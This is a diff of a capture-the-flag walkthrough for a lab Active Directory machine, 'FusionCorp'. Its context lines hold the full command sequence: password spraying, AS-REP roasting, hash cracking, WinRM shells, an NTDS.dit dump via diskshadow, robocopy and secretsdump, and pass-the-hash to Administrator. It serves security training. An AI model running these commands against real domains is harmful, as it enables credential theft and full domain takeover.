@@ -106,15 +106,15 @@ contactform             [Status: 301, Size: 154, Words: 9, Lines: 2, Duration: 1
 ### Finding Domain Usernames
 Checking out the landing page shows a static site to host the organization's services on. Other than the section about team members that we can use to create a user wordlist, there's not much on this page that helps us.
 
-![](../assets/img/2026-03-12-FusionCorp/1.png)
+![](/assets/img/2026-03-12-FusionCorp/1.png)
 
 My scans picked up a few normal directories that don't contain any crazy files other than basic site functionality (e.g. main.js and style.css), however one stood out. Under the `/backups` dir, we're able to grab an `employees.ods` file (spreadsheet) that lists emplyees along with their corresponding usernames on the domain.
 
-![](../assets/img/2026-03-12-FusionCorp/2.png)
+![](/assets/img/2026-03-12-FusionCorp/2.png)
 
 I open this file with [Gnumeric](https://gnome.pages.gitlab.gnome.org/gnumeric-web/) on my Kali machine. You can install it by running `sudo apt install gnumeric`, make sure to update your package manager beforehand if you run into any errors.
 
-![](../assets/img/2026-03-12-FusionCorp/3.png)
+![](/assets/img/2026-03-12-FusionCorp/3.png)
 
 ### Password Spraying
 After adding those to a wordlist, I test if any of these accounts have their username reused as their password.
@@ -123,7 +123,7 @@ After adding those to a wordlist, I test if any of these accounts have their use
 $ nxc smb fusion.corp -u users.txt -p users.txt --continue-on-success --no-brute
 ```
 
-![](../assets/img/2026-03-12-FusionCorp/4.png)
+![](/assets/img/2026-03-12-FusionCorp/4.png)
 
 This doesn't work, but we still have a list of useful usernames on the domain which will help us later. Checking if RPC and LDAP allow for anonymous login/binds shows that this really was the only way to enumerate these names.
 
@@ -133,7 +133,7 @@ $ rpcclient fusion.corp -U ''
 $ ldapsearch -H ldap://fusion-dc.fusion.corp -x -b "DC=fusion,DC=corp"
 ```
 
-![](../assets/img/2026-03-12-FusionCorp/5.png)
+![](/assets/img/2026-03-12-FusionCorp/5.png)
 
 ## AS-REP Roasting
 Due to us still not having any valid credentials or ways to authenticate anywhere, I'll check to see if any of these accounts are AS-REP roastable which could give us a user's password if cracked. 
@@ -147,7 +147,7 @@ To do this, I use a tool called [Kerbrute](https://github.com/ropnop/kerbrute) t
 $ ./kerbrute userenum ../users.txt --dc fusion-dc.fusion.corp -d fusion.corp
 ```
 
-![](../assets/img/2026-03-12-FusionCorp/6.png)
+![](/assets/img/2026-03-12-FusionCorp/6.png)
 
 ### Getting KRB5ASREP Hash
 This returns just one valid user named `lparker`. The chance is slim, but next I'll use Impacket's [GetNPUsers.py script](https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py) to test if his account has Kerberos pre-authentication disabled, therefore granting us a krb5asrep hash to crack.
@@ -156,7 +156,7 @@ This returns just one valid user named `lparker`. The chance is slim, but next I
 $ impacket-GetNPUsers -dc-ip 10.64.183.145 -usersfile ../users.txt -no-pass fusion.corp/
 ```
 
-![](../assets/img/2026-03-12-FusionCorp/7.png)
+![](/assets/img/2026-03-12-FusionCorp/7.png)
 
 ### Cracking Hash
 That actually works and we're rewarded with Larry Parker's hash, who's also the only real user on the box. Now let's send that over to Hashcat or JohnTheRipper to get the plaintext variant so that we can authenticate elsewhere.
@@ -167,7 +167,7 @@ $ echo "[KRB5ASREP_HASH_VALUE]" > hash
 $ john hash --wordlist=/opt/SecLists/rockyou.txt
 ```
 
-![](../assets/img/2026-03-12-FusionCorp/8.png)
+![](/assets/img/2026-03-12-FusionCorp/8.png)
 
 Checking to see if this works shows that he has read permissions on a few standard shares, but nothing that will help us over SMB.
 
@@ -175,7 +175,7 @@ Checking to see if this works shows that he has read permissions on a few standa
 $ nxc smb fusion.corp -u 'lparker' -p '[REDACTED]' --shares
 ```
 
-![](../assets/img/2026-03-12-FusionCorp/9.png)
+![](/assets/img/2026-03-12-FusionCorp/9.png)
 
 In Microsoft Windows environments, each security principal (users, groups, computers) is assigned a Relative Identifier (RID) as the last portion of its SID. Because RIDs are often allocated sequentially, attackers can brute-force RID values over protocols like SMB or RPC to query which SIDs exist and resolve them into account names, effectively enumerating valid usernames on a given domain.
 
@@ -221,7 +221,7 @@ Since Nmap discovered that port 5985 was open, I check if Larry is apart of the 
 $ nxc winrm fusion.corp -u 'lparker' -p '[REDACTED]'
 ```
 
-![](../assets/img/2026-03-12-FusionCorp/10.png)
+![](/assets/img/2026-03-12-FusionCorp/10.png)
 
 We can use a tool like Evil-WinRM to grab a shell on the box, as well as retrieve the first flag under his Desktop folder.
 
@@ -229,7 +229,7 @@ We can use a tool like Evil-WinRM to grab a shell on the box, as well as retriev
 $ evil-winrm -i fusion.corp -u lparker -p '[REDACTED]'
 ```
 
-![](../assets/img/2026-03-12-FusionCorp/11.png)
+![](/assets/img/2026-03-12-FusionCorp/11.png)
 
 From here, I start internal enumeration to search for any ways to escalate privileges and pivot to either Administrator or Jmurphy. We don't have access to either of their home directories, so I'll focus on strictly permissions.
 
@@ -245,7 +245,7 @@ $ sudo bloodhound
 ### Creds in Description Attribute
 It seems like Larry Parker has no outbound object control and is not apart of any groups with interesting permissions. Since we won't be able to do anything as Larry, I start enumeration on other domain users. This led me to finding a password for Jmurphy in the description attribute on his account.
 
-![](../assets/img/2026-03-12-FusionCorp/12.png)
+![](/assets/img/2026-03-12-FusionCorp/12.png)
 
 Testing this for valid authentication reveals that it's still up to date and we can swap over to getting a shell as them via Evil-WinRM once again.
 
@@ -257,18 +257,18 @@ WINRM       10.64.190.161   5985   FUSION-DC        [+] fusion.corp\jmurphy:[RED
 $ evil-winrm -i fusion.corp -u jmurphy -p '[REDACTED]'
 ```
 
-![](../assets/img/2026-03-12-FusionCorp/13.png)
+![](/assets/img/2026-03-12-FusionCorp/13.png)
 
 At this point, we can grab the second flag under his Desktop folder and start our endeavor towards Administrator.
 
 ### Abusing Backup Operator Privs
 Checking out his account shows that they are in the Backup Operators group. That means all users within it should have access to the `SeBackup` and `SeRestore` privileges, which can be utilized to clone the filesystem and extract hashes from the `NTDS.dit` file.
 
-![](../assets/img/2026-03-12-FusionCorp/14.png)
+![](/assets/img/2026-03-12-FusionCorp/14.png)
 
 We could also discover this from the CLI by listing groups and privileges with `whoami /all`.
 
-![](../assets/img/2026-03-12-FusionCorp/15.png)
+![](/assets/img/2026-03-12-FusionCorp/15.png)
 
 There's a pretty common way to dump the AD database by cloning the NTDS.dit file using the DiskShadow executable. [This article](https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960) is a great resource that goes in-depth on a few ways to exploit this privilege.
 
@@ -294,7 +294,7 @@ Make sure you use unix2dos in order for this file to be compatible with Windows.
 $ diskshadow /s backup_script.dsh
 ```
 
-![](../assets/img/2026-03-12-FusionCorp/16.png)
+![](/assets/img/2026-03-12-FusionCorp/16.png)
 
 Once that script is officially done, we can utilize another executable our account has access to, which is robocopy. This will allow us to copy files from the newly-created `Z:\` drive to the Temp directory in order to download certain files. We want the `NTDS.dit` file which contains users hashes on the domain, including Administrator. 
 
@@ -302,7 +302,7 @@ Once that script is officially done, we can utilize another executable our accou
 $ robocopy /b Z:\Windows\ntds . ntds.dit
 ```
 
-![](../assets/img/2026-03-12-FusionCorp/17.png)
+![](/assets/img/2026-03-12-FusionCorp/17.png)
 
 In order for us to decrypt `NTDS.dit`, we'll need the boot key from the `SYSTEM` hive so we can actually extract these hashes. Luckily we can just create a backup of it wherever we please. Lastly, I use Evil-WinRM's download function to transfer these files to my attack box.
 
@@ -319,7 +319,7 @@ Once those two files are on our local machine, we can use Impacket's [secretsdum
 $ impacket-secretsdump -system system.bak -ntds ntds.dit LOCAL
 ```
 
-![](../assets/img/2026-03-12-FusionCorp/18.png)
+![](/assets/img/2026-03-12-FusionCorp/18.png)
 
 Finally, we can attempt to crack this NTLM hash or peform a Pass-The-Hash attack over WinRM to grab a shell as Administrator. Snagging the root flag under their Desktop folder will complete this box.
 
@@ -327,6 +327,6 @@ Finally, we can attempt to crack this NTLM hash or peform a Pass-The-Hash attack
 $ evil-winrm -i fusion-dc.fusion.corp -u administrator -H '[ADMIN_NTLM_HASH]'
 ```
 
-![](../assets/img/2026-03-12-FusionCorp/19.png)
+![](/assets/img/2026-03-12-FusionCorp/19.png)
 
 That's all y'all, this box wasn't too difficult if you know what to look for. AS-REP roasting remains ever useful in grabbing valid domain credentials and BloodHound is a powerful tool for mapping AD compromise as it's really about finding where trust is established. I hope this was helpful to anyone following along or stuck and happy hacking!
